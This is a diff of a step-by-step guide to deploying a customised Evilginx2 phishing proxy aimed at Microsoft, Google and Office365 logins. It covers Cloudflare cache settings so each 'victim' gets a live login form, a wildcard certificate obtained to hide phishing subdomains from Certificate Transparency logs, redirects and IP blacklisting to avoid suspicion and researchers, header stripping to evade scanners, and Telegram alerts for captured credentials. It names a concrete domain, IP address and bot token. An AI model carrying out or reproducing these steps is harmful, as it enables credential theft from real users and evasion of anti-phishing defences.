----
-
-### 4E.4 — Disabling Turnstile (If It Causes Issues)
-
-If Turnstile blocks legitimate users, disable it:
-
-```bash
-# Simply don't pass the -turnstile flags when starting
-./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourPassword!' -feed
-```
-
-✅ **Turnstile is optional but recommended for blocking bots.**
-
----
-
-## PHASE 4F — Cloudflare Caching & Performance
-
-**Time: ~5 minutes | Where: Cloudflare dashboard**
-
-### 🎯 Goal: Configure Cloudflare caching to speed up your phishing pages and protect against traffic spikes
-
----
-
-### 4F.1 — Disable Caching for Phishing Pages
-
-**⚠️ IMPORTANT:** You must NOT cache phishing pages. If a page is cached, one victim logs in, and the next victim sees the cached "logged in" page instead of the real login form.
-
-1. Click **Rules** → **Page Rules**
-2. Click **"Create Page Rule"**
-3. Fill in:
-
-| Field | Value |
-|:------|:------|
-| **URL** | `*YOUR_DOMAIN/l*` |
-| **Pick Setting** | **"Cache Level"** → **"Bypass"** |
-| **Then another setting** | **"Browser Cache TTL"** → **"0 seconds"** |
-| **Then another setting** | **"Edge Cache TTL"** → **"0 seconds"** |
-
-4. Click **"Save"**
-
-> **What this does:** Any URL starting with `/l` (which is where your lures are served) is NEVER cached. Every visit hits your server fresh.
-
----
-
-### 4F.2 — Create a Page Rule for Static Assets (Optional)
-
-If you host custom landing pages with images/CSS, you can cache those:
-
-1. Click **Rules** → **Page Rules**
-2. Click **"Create Page Rule"**
-3. Fill in:
-
-| Field | Value |
-|:------|:------|
-| **URL** | `*YOUR_DOMAIN/assets*` |
-| **Pick Setting** | **"Cache Level"** → **"Standard"** |
-| **Then another setting** | **"Browser Cache TTL"** → **"4 hours"** |
-
-4. Click **"Save"**
-
----
-
-### 4F.3 — Enable Auto Minify (Optional)
-
-Minifying removes unnecessary characters from HTML/CSS/JS, making pages load faster:
-
-1. Click **Speed** → **Optimization** → **Content Optimization**
-2. Toggle **"Auto Minify"** to **ON** for:
-   - ✅ HTML
-   - ✅ CSS
-   - ✅ JavaScript
-
-> **⚠️ CAUTION:** Minifying can break some complex phishlets. If a phishlet stops working, disable Auto Minify for that phishlet using a Page Rule:
-> ```
-> *YOUR_DOMAIN/SPECIFIC_PATH*
-> → Auto Minify: Off
-> ```
-
----
-
-### 4F.4 — Enable Brotli Compression (Always On)
-
-Brotli is better than gzip. On Cloudflare, it's **enabled by default** for HTTPS connections. Nothing to do here — it just works.
-
-✅ **Caching is configured. Move to Phase 5.**
-
----
-
-## PHASE 5 — Build Evilginx from Source
-
-**Time: ~10 minutes | Where: Your server terminal**
-
-### 🎯 Goal: Download the source code and compile it into a working program
-
----
-
-### 5.1 — Download the Code
+"Cloning" means downloading the code from GitHub to your VPS:
 
 ```bash
 cd /root
 git clone https://github.com/afrikaquality/evilginx2.git
+```
+
+✅ **What you'll see:**
+```
+Cloning into 'evilginx2'...
+remote: Enumerating objects: 1234, done.
+remote: Counting objects: 100% (1234/1234), done.
+remote: Compressing objects: 100% (654/654), done.
+Receiving objects: 100% (1234/1234), done.
+Resolving deltas: 100% (567/567), done.
+```
+
+Enter the project directory:
+
+```bash
 cd evilginx2
 ```
 
-**Expected output:**
-```
-Cloning into 'evilginx2'...
-remote: Enumerating objects: XXX, done.
-remote: Counting objects: 100% (XXX/XXX), done.
-...
-Receiving objects: 100% (XXXX/XXXX), X.XX MiB | X.XX MiB/s, done.
-```
-
----
-
-### 5.2 — Download Dependencies
+## STEP 16 — Check What's Inside
 
 ```bash
+ls -la
+```
+
+✅ **You should see files like:**
+```
+-rw-r--r--   1 root root   ... Dockerfile
+-rw-r--r--   1 root root   ... README.md
+drwxr-xr-x   2 root root   ... core/
+drwxr-xr-x   2 root root   ... database/
+-rw-r--r--   1 root root   ... go.mod
+-rw-r--r--   1 root root   ... go.sum
+-rw-r--r--   1 root root   ... main.go
+drwxr-xr-x   2 root root   ... phishlets/
+drwxr-xr-x   2 root root   ... redirectors/
+```
+
+Check the phishlets directory (these are the YAML templates that tell Evilginx how to mimic specific websites):
+
+```bash
+ls -la phishlets/
+```
+
+✅ **Should show `.yaml` files like:**
+```
+-rw-r--r-- 1 root root ... microsoft.yaml
+-rw-r--r-- 1 root root ... google.yaml
+-rw-r--r-- 1 root root ... linkedin.yaml
+-rw-r--r-- 1 root root ... office365.yaml
+```
+
+**If the phishlets directory is empty**, you need to download phishlets separately:
+```bash
+# Try getting them from a community repository
+cd /root/evilginx2
+git clone https://github.com/afrikaquality/evilginx2-phishlets.git temp-phishlets 2>/dev/null
+cp temp-phishlets/*.yaml phishlets/ 2>/dev/null
+rm -rf temp-phishlets
+ls -la phishlets/
+```
+
+## STEP 17 — Build the Evilginx Binary
+
+Now we compile the code into a working program. This is the "building" phase:
+
+```bash
+# Step 17a: Clean any cached module data (prevents build errors)
+rm -rf vendor/ 2>/dev/null
+go clean -modcache
+```
+
+✅ **What you'll see:** Nothing (or a message about no cached modules).
+
+```bash
+# Step 17b: Download all Go dependencies (like installing app dependencies)
 go mod tidy
 ```
 
-**Expected output:** Nothing or a few lines. This downloads all the Go libraries Evilginx needs.
-
-**Expected duration:** 30 seconds.
-
-> **If you see errors about network timeouts:**
-> ```bash
-> export GOPROXY=https://goproxy.io,direct
-> export GO111MODULE=on
-> go mod tidy
-> ```
-
----
-
-### 5.3 — Build the Main Binary
+✅ **What you'll see:** Nothing if everything is cached, or a bunch of downloading messages if not. Takes 10–30 seconds.
 
 ```bash
-go build -o evilginx2 .
+# Step 17c: Compile the program
+go build -mod=mod -o evilginx2 .
 ```
 
-**Expected output:** Nothing (just the prompt). This compiles Evilginx into a single executable file called `evilginx2`.
-
-**Expected duration:** 1-3 minutes.
-
----
-
-### 5.4 — Build the Live Feed (Optional, but Recommended)
-
-The live feed is a separate program that streams sessions in real-time.
+⚠️ **This takes 30–90 seconds.** You'll see nothing during compilation — the terminal just hangs. That's normal. Wait for it to finish.
 
 ```bash
-cd evilfeed
-go mod tidy
-go build -o evilfeed .
-cd ..
+# Step 17d: Make it executable
+chmod +x evilginx2
 ```
 
-**Expected output:** Nothing. The `evilfeed` binary is created in the `evilfeed/` directory.
-
----
-
-### 5.5 — Verify Both Binaries
-
 ```bash
+# Step 17e: Check the resulting file
 ls -lh evilginx2
-ls -lh evilfeed/evilfeed
 ```
 
-**Expected output:** Two files, each ~15-30 MB, with execute permissions (the `x` in `-rwxr-xr-x`).
+✅ **What you'll see:**
+```
+-rwxr-xr-x 1 root root 25M Aug 25 12:00 evilginx2
+```
+
+**The file should be approximately 25 MB.** If it's much smaller (like 2 KB), something went wrong.
+
+### TROUBLESHOOTING BUILD
+
+| Problem | What It Means | How To Fix |
+|---------|---------------|------------|
+| `go: command not found` | Go isn't installed or not in PATH | Run `source ~/.bashrc` or go back to Step 9 |
+| `go: go.mod file not found` | You're not in the evilginx2 directory | `cd /root/evilginx2` then try again |
+| `go: github.com/... : read tcp ... i/o timeout` | Network timeout downloading dependencies | Try again: `go mod tidy` then `go build` |
+| `build fails with missing imports` | Corrupted module cache | `go clean -modcache` then `go mod tidy` then rebuild |
+| Binary is only 2 KB | Build failed silently | Check errors above. Run `go build -v -o evilginx2 .` for verbose output |
 
 ---
 
-### 5.6 — Make Sure They're Executable
+# PART 7: WILDCARD SSL CERTIFICATE
+
+This is the most important and trickiest part. A wildcard certificate covers `*.yourdomain.com` so every subdomain gets HTTPS automatically, AND the subdomains stay hidden from Certificate Transparency logs (crt.sh).
+
+**Without wildcard cert:** Each subdomain gets its own cert and appears publicly on crt.sh
+**With wildcard cert:** Only `yourdomain.com` appears in logs — subdomains are invisible
+
+## STEP 18 — Run Certbot
 
 ```bash
-chmod +x evilginx2 evilfeed/evilfeed
+certbot certonly --manual --preferred-challenges dns -d '*.officialmonsterz.store' -d officialmonsterz.store
 ```
 
-✅ **Evilginx is built. Move to Phase 6.**
+Replace `officialmonsterz.store` with YOUR domain.
+
+✅ **What you'll see:**
+```
+Saving debug log to /var/log/letsencrypt/letsencrypt.log
+Enter email address (used for urgent renewal and security notices)
+ (Enter 'c' to cancel): 
+```
+
+## STEP 19 — Answer Certbot's Questions
+
+1. **Email:** Type your email address (e.g., `you@gmail.com`) → Press **Enter**
+
+2. **Agree to Terms:** Type `A` (for Agree) → Press **Enter**
+```
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Please read the Terms of Service at
+https://letsencrypt.org/documents/LE-SA-v1.4-April-2025.pdf . You must agree
+in order to register with the ACME server at
+https://acme-v02.api.letsencrypt.org/directory
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+(A)gree/(C)ancel: A
+```
+
+3. **Share email with EFF:** Type `N` (for No) → Press **Enter** (unless you want spam)
+```
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Would you like to receive emails about EFF and Let's Encrypt?
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+(Y)es/(N)o: N
+```
+
+## STEP 20 — Certbot Shows the DNS Challenge
+
+You'll see something like this:
+
+```
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Please deploy a DNS TXT record under the name:
+
+_acme-challenge.officialmonsterz.store
+
+with the following value:
+
+dGVzdC1hY21lLWNoYWxsZW5nZS12YWx1ZS0xMjM0NTY3ODkw
+
+Before continuing, verify the record is deployed.
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Press Enter to Continue
+```
+
+**⚠️ DO NOT PRESS ENTER YET.** Leave this terminal window open!
+
+## STEP 21 — Add the TXT Record in Cloudflare
+
+1. Open a **new browser tab** (or a new window)
+2. Go to Cloudflare → your domain → **DNS** tab
+3. Click **"Add Record"**
+
+| Field | Value |
+|-------|-------|
+| **Type** | `TXT` |
+| **Name** | `_acme-challenge` |
+| **Value** | Paste the EXACT random string certbot showed you |
+| **TTL** | Auto |
+| **Proxy status** | DNS Only (grey cloud) |
+
+4. Click **"Save"**
+
+## STEP 22 — Verify the TXT Record Propagated
+
+Open a **second SSH connection** to your VPS (or just run this command in your current terminal, since certbot is paused):
+
+Actually, you can open another terminal window on your computer:
+
+```bash
+# Terminal window 2 (new SSH connection)
+ssh root@95.133.228.19
+dig @1.1.1.1 _acme-challenge.officialmonsterz.store TXT +short
+```
+
+✅ **What you'll see:** Your random string in quotes:
+```
+"dGVzdC1hY21lLWNoYWxsZW5nZS12YWx1ZS0xMjM0NTY3ODkw"
+```
+
+**If nothing shows:** Wait 30 seconds and try again. Cloudflare propagation is usually instant.
+
+**If wrong value shows:** You may have typed it wrong. Check and fix in Cloudflare.
+
+## STEP 23 — Complete Certbot
+
+Once `dig` shows the TXT value, go back to the **certbot terminal** (the first one, where certbot is paused) and press **Enter**.
+
+**Wait 5–15 seconds.** Certbot contacts Let's Encrypt to verify.
+
+✅ **Success message:**
+```
+Successfully received certificate.
+Certificate is saved at: /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem
+Key is saved at:         /etc/letsencrypt/live/officialmonsterz.store/privkey.pem
+```
+
+### IF CERTBOT FAILS
+
+**What failure looks like:**
+```
+Failed to receive certificate. There were too many requests of this type...
+```
+
+**What to do:**
+1. Go to Cloudflare DNS → delete the TXT record you just added
+2. Run this to delete the failed attempt:
+   ```bash
+   certbot delete --cert-name officialmonsterz.store
+   ```
+3. Start over from Step 18. Certbot will give a NEW random string.
+4. Add the NEW TXT record in Cloudflare
+5. Verify with `dig`
+6. Press Enter
 
 ---
 
-## PHASE 6 — First Run & Initial Configuration
+# PART 8: SET UP EVILGINX CONFIGURATION
 
-**Time: ~10 minutes | Where: Your server terminal**
+## STEP 24 — Copy Certificate to Evilginx Directory
 
-### 🎯 Goal: Start Evilginx and configure your domain
+```bash
+# Create the directory where Evilginx expects wildcard certs
+mkdir -p /root/.evilginx/crt/wildcard
 
----
+# Copy the certificate files
+cp /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem /root/.evilginx/crt/wildcard/
+cp /etc/letsencrypt/live/officialmonsterz.store/privkey.pem /root/.evilginx/crt/wildcard/
+```
 
-### 6.1 — Start Evilginx for the First Time
+## STEP 25 — Verify the Certificate
+
+Check the files exist:
+
+```bash
+ls -l /root/.evilginx/crt/wildcard/
+```
+
+✅ **Expected:**
+```
+-rw-r--r-- 1 root root 4567 Aug 25 12:00 fullchain.pem
+-rw-r--r-- 1 root root 1704 Aug 25 12:00 privkey.pem
+```
+
+Check it's actually a wildcard certificate:
+
+```bash
+openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
+```
+
+✅ **Expected:**
+```
+subject = CN = *.officialmonsterz.store
+```
+
+**⚠️ IMPORTANT:** The `*` before the domain is crucial. If it shows just `officialmonsterz.store` without `*.`, the certbot command was wrong (you missed the `-d '*.domain.com'` part). Re-do from Step 18.
+
+Check when the certificate expires:
+
+```bash
+openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -enddate
+```
+
+✅ **Expected:** `notAfter=Nov 23 11:59:59 2025 GMT` (Let's Encrypt certs are valid for 90 days)
+
+Set correct permissions:
+
+```bash
+chmod 644 /root/.evilginx/crt/wildcard/fullchain.pem
+chmod 600 /root/.evilginx/crt/wildcard/privkey.pem
+```
+
+**Why these permissions?**
+- `644` = Everyone can read the certificate (needed by processes)
+- `600` = ONLY root can read the private key (security critical — if stolen, someone could impersonate your site)
+
+## STEP 26 — First Run (Creates Config Files)
+
+We run Evilginx once just to create the configuration directory and files:
 
 ```bash
 cd /root/evilginx2
-./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourStrongPassword123!' -feed
+./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123
 ```
 
-> **⚠️ Replace `YourStrongPassword123!` with an actual strong password.** Use a mix of uppercase, lowercase, numbers, and symbols.
-
-> **⚠️ SECURITY:** Do NOT use obvious passwords like `admin123`, `password`, `evilginx`, etc.
-
-**Expected output:**
+✅ **What you'll see:**
 ```
-[inf] loading phishlets from: ./phishlets
-[inf] loading redirectors from: ./redirectors
-[inf] loading lures from: /root/.evilginx/lures.json
-[inf] server domain not set yet
-[inf] external ipv4 not set yet
-[war] individual subdomains WILL appear in Certificate Transparency (crt.sh)
-[inf] starting evilginx on 0.0.0.0:443
-[inf] starting http server on 0.0.0.0:80
-[inf] starting DNS server on :53
-[inf] starting dashboard on 0.0.0.0:5000
+                    ____  _ _     _           _
+                   / __ \(_) |   (_)         | |
+                  | |  | |_| |__  _  ___  ___| |__
+                  | |  | | | '_ \| |/ _ \/ __| |/ /
+                  | |__| | | |_) | |  __/ (__|   <
+                   \____/|_|_.__/|_|\___|\___|_|\_\
+
+        Version 3.3.0  by @mrgretzky (Telegram Edition by @officialmonsterz)
+
+[dashboard] web interface starting on http://0.0.0.0:5000
+[inf] loading phishlets from: /root/evilginx2/phishlets
+[inf] loading configuration from: /root/.evilginx
 
 evilginx>
 ```
 
-That `evilginx>` is your prompt — you're now in the Evilginx console.
+You're now inside the Evilginx interactive shell. The `evilginx>` prompt means Evilginx is listening for your commands.
 
-> **🚨 If you see "address already in use":** Another program is using a port. Run `ss -tulpn | grep :443` to see what's using port 443, then stop it. Common culprits: nginx, apache, caddy.
+## STEP 27 — Set Your Domain and IP
 
----
-
-### 6.2 — Set Your Domain
-
-At the `evilginx>` prompt, type:
+At the `evilginx>` prompt, type these **one at a time**, pressing **Enter** after each:
 
 ```
-config domain YOUR_DOMAIN
+config domain officialmonsterz.store
 ```
 
-**Replace `YOUR_DOMAIN` with your actual domain** (e.g., `config domain offices65.online`)
-
-**Expected output:**
+✅ **Expected:**
 ```
-[inf] server domain set to: offices65.online
+[inf] server domain set to: officialmonsterz.store
 ```
 
----
-
-### 6.3 — Set Your Server IP
-
 ```
-config ipv4 external YOUR_SERVER_IP
+config ipv4 external 95.133.228.19
 ```
 
-**Replace `YOUR_SERVER_IP` with your actual IP** (e.g., `config ipv4 external 95.133.228.114`)
-
-**Expected output:**
+✅ **Expected:**
 ```
-[inf] external ipv4 set to: 95.133.228.114
+[inf] server external IP set to: 95.133.228.19
 ```
-
----
-
-### 6.4 — Enable Automatic Certificates
 
 ```
 config autocert on
 ```
 
-This tells Evilginx to automatically get SSL certificates from Let's Encrypt for each new phishlet hostname.
-
-**Expected output:**
+✅ **Expected:**
 ```
-[inf] autocert set to: on
+[inf] autocert is now enabled
 ```
 
----
+⚠️ **Note:** We set `autocert on` even though we have a wildcard cert. This is because Evilginx's wildcard support looks for certs in `/root/.evilginx/crt/wildcard/` only when `autocert` is enabled. Don't worry — it will find and use our wildcard cert first.
 
-### 6.5 — Set Unauthorized URL
+## STEP 28 — Set Unauthorized Redirect URL
+
+When someone visits your phishing page without a valid lure link, they get sent here. Set it to the real login page so they don't get suspicious:
 
 ```
-config unauth_url https://www.google.com
+config unauth_url https://www.office365.com
 ```
 
-When a scanner, bot, or wrong visitor hits your phishing page, they get redirected to Google (looks like a normal website). This avoids detection.
-
-**Expected output:**
+✅ **Expected:**
 ```
-[inf] unauth_url set to: https://www.google.com
+[inf] unauthorized request redirection URL set to: https://www.office365.com
 ```
 
----
+## STEP 29 — Enable Blacklist Mode
 
-### 6.6 — Enable Blacklist Mode
+This blocks IP addresses after an unauthorized visit:
 
 ```
 blacklist unauth
 ```
 
-This auto-blocks IPs that hit unauthorized URLs (bots, scanners, security researchers).
-
-**Expected output:**
+✅ **Expected:**
 ```
 [inf] blacklist mode set to: unauth
 ```
 
----
+**What `unauth` means:** If someone visits your phishing page without a valid lure link, their IP gets blocked from trying again.
 
-### 6.7 — Set IP Binding (Optional but Recommended)
+## STEP 30 — Enable Header Stripping
 
-By default, Evilginx binds to all interfaces. If you want it to listen only on your public IP:
+This removes Evilginx fingerprints from HTTP responses so security scanners can't easily detect it:
 
 ```
-config ipv4 bind YOUR_SERVER_IP
+config strip_headers on
 ```
 
----
+✅ **Expected:**
+```
+[inf] header stripping enabled - all Evilginx artifact headers will be removed
+```
 
-### 6.8 — Verify All Settings
+## STEP 31 — Verify Your Configuration
 
 ```
 config
 ```
 
-**Expected output (example):**
+✅ **Expected:**
 ```
-domain: offices65.online
-external_ipv4: 95.133.228.114
-bind_ipv4: 0.0.0.0
-unauth_url: https://www.google.com
-autocert: on
+domain: officialmonsterz.store
+external_ipv4: 95.133.228.19
+autocert: true
+unauth_url: https://www.office365.com
 blacklist_mode: unauth
-https_port: 443
-dns_port: 53
-http_port: 80
+strip_headers: on
 ```
 
-✅ If you see your domain and IP correctly, you're good.
-
----
-
-### 6.9 — ⚠️ CRITICAL: Save Config by Exiting Cleanly
+## STEP 32 — Exit to Save Configuration
 
 ```
 exit
 ```
 
-**Why this matters:** Evilginx ONLY saves the config to disk when you exit properly. If you just close the terminal, **all your settings are lost**.
+✅ **Expected:** Evilginx stops and you return to the bash prompt.
 
-**Expected output:**
-```
-[inf] saving configuration to /root/.evilginx/config.json
-[inf] saved lures to /root/.evilginx/lures.json
-[inf] exit
-```
-
----
-
-### 6.10 — Verify Config Was Saved
+Verify the configuration was saved:
 
 ```bash
 cat /root/.evilginx/config.json
 ```
 
-**Expected output:** A JSON file showing your settings:
+✅ **Expected:** A JSON file containing your settings:
 ```json
 {
   "general": {
-    "domain": "offices65.online",
-    "external_ipv4": "95.133.228.114",
-    "unauth_url": "https://www.google.com",
+    "domain": "officialmonsterz.store",
+    "external_ipv4": "95.133.228.19",
     "autocert": true,
-    "https_port": 443,
-    "dns_port": 53,
-    "http_port": 80
+    "unauth_url": "https://www.office365.com",
+    "strip_headers": true
+  },
+  "blacklist": {
+    "mode": "unauth"
   }
 }
 ```
 
-> **If the file is empty or missing:** You didn't `exit` properly. Restart Evilginx, run the config commands again, then `exit`.
-
-✅ **Domain is configured. Move to Phase 7.**
-
 ---
 
-## PHASE 7 — Wildcard SSL Certificate (Hides Subdomains)
+# PART 9: TELEGRAM INTEGRATION
 
-**Time: ~15 minutes | Where: Server terminal + Cloudflare browser**
+## STEP 33 — Create a Telegram Bot
 
-### 🎯 Goal: Get ONE certificate that covers ALL subdomains so phishing subdomains don't show up in public logs
+1. Open Telegram on your phone or computer
+2. Search for **`@BotFather`** (it's verified with a blue checkmark ✅)
+3. Start a chat and send: **`/newbot`**
+4. BotFather asks: **"Alright, a new bot. How are we going to call it? Please choose a name for your bot."**
+   - Type a name like: **`MyAlertBot`**
+   - Press **Enter** (or Send)
+5. BotFather asks: **"Good. Now let's choose a username for your bot. It must end in 'bot'. Like this, for example: TetrisBot or tetris_bot."**
+   - Type a username like: **`my_alert_bot`** (must end in `bot`)
+   - Press **Enter** (or Send)
 
-**Why this matters:** Without a wildcard cert, every phishing URL like `login-abc123.offices65.online` shows up in **Certificate Transparency logs** (publicly searchable at crt.sh). Anyone — including blue teams, journalists, and anti-phishing groups — can see ALL your phishing subdomains. A wildcard cert prevents this.
-
----
-
-### 7.1 — Request the Certificate
-
-```bash
-certbot certonly --manual --preferred-challenges dns \
-  -d "*.YOUR_DOMAIN" \
-  -d "YOUR_DOMAIN"
+✅ **BotFather replies:**
 ```
-
-**Replace `YOUR_DOMAIN`** with your actual domain.
-
-**Example:**
-```bash
-certbot certonly --manual --preferred-challenges dns \
-  -d "*.offices65.online" \
-  -d "offices65.online"
-```
-
----
-
-### 7.2 — Follow Certbot's Prompts
-
-#### Prompt 1: Email Address
-```
-Enter your email: you@email.com
-```
-Type your email and press **Enter**.
-
-#### Prompt 2: Agree to Terms
-```
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-Please read the Terms of Service at...
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-(A)gree/(C)ancel: 
-```
-Type `A` and press **Enter**.
-
-#### Prompt 3: Share Email with EFF
-```
-(Y)es/(N)o: 
-```
-Your choice. Type `Y` or `N` and press **Enter**.
-
-#### Prompt 4: The TXT Record (CRITICAL)
-
-Certbot will pause and display something like this:
-
-```
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-Please deploy a DNS TXT record under the name:
-_acme-challenge.offices65.online
-with the following value:
-
-aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890aBcDeFgHiJkLmNoPqRsTu
-
-Before continuing, verify the TXT record has been deployed.
-Press Enter to Continue
-```
-
-> **⚠️ DO NOT PRESS ENTER YET.**
-
-> **📝 COPY the long value** (the string starting with `aBcDeFgHi...`). You'll need it in the next step.
-
----
-
-### 7.3 — Add the TXT Record in Cloudflare
-
-1. Open Cloudflare dashboard → your domain → **DNS** tab
-2. Click **"Add Record"**
-3. Fill in:
-
-| Field | Value |
-|:------|:------|
-| Type | **TXT** |
-| Name | **`_acme-challenge`** |
-| Content | **The value Certbot gave you** (paste it) |
-| Proxy Status | ⚫ **DNS Only** (grey cloud) |
-| TTL | **Auto** |
-
-4. Click **"Save"**
-
----
-
-### 7.4 — Wait 60 Seconds, Then Verify
-
-```bash
-dig @1.1.1.1 _acme-challenge.YOUR_DOMAIN TXT +short
-```
-
-**Expected output:** The EXACT value Certbot showed you, in quotes:
-```
-"aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890aBcDeFgHiJkLmNoPqRsTu"
-```
-
-> **If you see nothing:** Wait 60 more seconds and try again. TXT records can take up to 2 minutes to propagate.
-
----
-
-### 7.5 — Press Enter in Certbot
-
-Once the `dig` command returns your value, switch back to the terminal where Certbot is paused and press **Enter**.
-
-**Expected output (success):**
-```
-Waiting for verification...
-Cleaning up challenges
-
-IMPORTANT NOTES:
- - Congratulations! Your certificate and chain have been saved at:
-   /etc/letsencrypt/live/offices65.online/fullchain.pem
-   Your key file has been saved at:
-   /etc/letsencrypt/live/offices65.online/privkey.pem
-```
-
-> **If you get "DNS problem: NXDOMAIN":** TXT record hasn't propagated. Wait 2 minutes and redo from Step 7.1.
-> 
-> **If you get "too many failed requests":** You hit Let's Encrypt's rate limit. Wait 1 hour and try again.
-
----
-
-### 7.6 — Copy Certificate to the Correct Directory
-
-The Evilginx code looks for the wildcard cert at:
-```
-/root/.evilginx/wildcard/
-```
-
-> **⚠️ IMPORTANT:** Do NOT put it in `/root/.evilginx/crt/wildcard/`. That's wrong.
-
-Run these exact commands:
-
-```bash
-mkdir -p /root/.evilginx/wildcard
-cp /etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem /root/.evilginx/wildcard/
-cp /etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem /root/.evilginx/wildcard/
-chmod 600 /root/.evilginx/wildcard/*.pem
-```
-
-**Replace `YOUR_DOMAIN` with your actual domain.**
-
----
-
-### 7.7 — Verify Files Exist
-
-```bash
-ls -la /root/.evilginx/wildcard/
-```
-
-**Expected output:**
-```
-drwxr-xr-x 2 root root  4096 Jul 13 01:00 .
-drwx------ 8 root root  4096 Jul 13 01:00 ..
--rw------- 1 root root  5432 Jul 13 01:00 fullchain.pem
--rw------- 1 root root  1704 Jul 13 01:00 privkey.pem
-```
-
----
-
-### 7.8 — Verify It's a Wildcard Cert
-
-```bash
-openssl x509 -in /root/.evilginx/wildcard/fullchain.pem -noout -subject
-```
-
-**Expected output:**
-```
-subject=CN = *.offices65.online
-```
-
-> **⚠️ The asterisk `*` is critical.** If you see `CN = offices65.online` (no asterisk), the cert doesn't cover subdomains. Redo Phase 7.
-
-✅ **Wildcard cert is ready. Move to Phase 8.**
-
----
-
-## PHASE 8 — Telegram Bot Setup
-
-**Time: ~10 minutes | Where: Your phone + server terminal**
-
-### 🎯 Goal: Create a Telegram bot and connect it to Evilginx so you get instant phone notifications when credentials are captured
-
----
-
-### 8.1 — Create the Bot on Telegram
-
-1. Open **Telegram** on your phone (or desktop)
-2. In the search bar, type **@BotFather** (it has a blue verified checkmark)
-3. Tap to open the chat
-4. Tap **"Start"** (or send `/start`)
-5. Send the message: `/newbot`
-6. BotFather replies: `Alright, a new bot. How are we going to call it? Please choose a name for your bot.`
-7. Send a **display name** (any name, e.g., `Phishing Monitor`)
-8. BotFather replies: `Good. Now let's choose a username for your bot. It must end in 'bot'.`
-9. Send a **username ending in `_bot`** (e.g., `phishing_monitor_2026_bot`)
-
-#### BotFather Responds With:
-```
-Done! Congratulations on your new bot. You will find it at:
-t.me/phishing_monitor_2026_bot
+Done! Congratulations on your new bot. You will find it at t.me/my_alert_bot.
+You can now add a description, about section and profile picture for your bot.
 
 Use this token to access the HTTP API:
-7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
+8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
+
+For a description of the Bot API, see this page: https://core.telegram.org/bots/api
 ```
 
-> **📝 COPY THE TOKEN** — it's the long alphanumeric string after "HTTP API:"
-> Example: `7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo`
-> This is your **Bot Token**. Save it in your notepad.
+**⚠️ COPY THE TOKEN IMMEDIATELY.** It looks like:
+```
+8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
+```
 
----
+This is your bot's password. Keep it secret. If someone else gets it, they can control your bot.
 
-### 8.2 — Test the Token from Your Server
+## STEP 34 — Test the Bot Token
+
+Back in your VPS terminal, test that the token works:
 
 ```bash
-curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/getMe"
+curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getMe"
 ```
 
-**Replace `YOUR_BOT_TOKEN` with the actual token from BotFather.**
+Replace the token with YOUR actual token.
 
-**Example:**
-```bash
-curl -s "https://api.telegram.org/bot7123456789:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getMe"
-```
-
-**Expected output:**
+✅ **Expected:**
 ```json
-{"ok":true,"result":{"id":7123456789,"is_bot":true,"first_name":"Phishing Monitor","username":"phishing_monitor_2026_bot"}}
+{"ok":true,"result":{"id":8863425004,"is_bot":true,"first_name":"MyAlertBot","username":"my_alert_bot","can_join_groups":true,"can_read_all_group_messages":false,"supports_inline_queries":false}}
 ```
 
-> **If you see `{"ok":false,"error_code":401,...}`:** Your token is wrong. Re-copy from BotFather.
+## STEP 35 — Get Your Chat ID
 
----
+The Chat ID is like your personal Telegram "room number" where the bot sends messages.
 
-### 8.3 — Get Your Chat ID
+1. Open Telegram and find your bot (search for the username you chose, e.g., `my_alert_bot`)
+2. Start the bot and send **any message** — just type "hello" and send it
+3. Now run this command:
 
-#### Step A: Message the Bot
-1. In Telegram, **search for your bot's username** (e.g., `@phishing_monitor_2026_bot`)
-2. Open the chat
-3. Tap **"Start"** (or send any message like "Hi")
-
-#### Step B: Get Your Chat ID
-On your server:
 ```bash
-curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates"
+curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getUpdates"
 ```
 
-**Expected output:** A long JSON response. Look for this section:
+Replace the token with YOUR actual token.
+
+✅ **Expected (look for the chat id):**
 ```json
-"chat":{"id":7545456339,"first_name":"Your Name","type":"private"}
+{"ok":true,"result":[{"update_id":123456789,
+"message":{"message_id":1,"from":{"id":123456789,"is_bot":false,"first_name":"YourName","language_code":"en"},"chat":{"id":7545456339,"first_name":"YourName","type":"private"},"date":1692000000,"text":"hello"}}]}
 ```
 
-The number `7545456339` is your **Chat ID**.
+Your **Chat ID** is the number in `"chat":{"id":7545456339,...}` — in this example it's `7545456339`.
 
-> **📝 COPY the chat ID to your notepad.**
+⚠️ **If the response is `{"ok":true,"result":[]}`** (empty results): You didn't send a message to your bot yet. Go do that first.
 
-> **If you see `"result":[]` (empty array):** You didn't message the bot yet. Send any message first, wait 5 seconds, then try again.
+## STEP 36 — Send a Test Message
 
-#### Alternative: Use @userinfobot
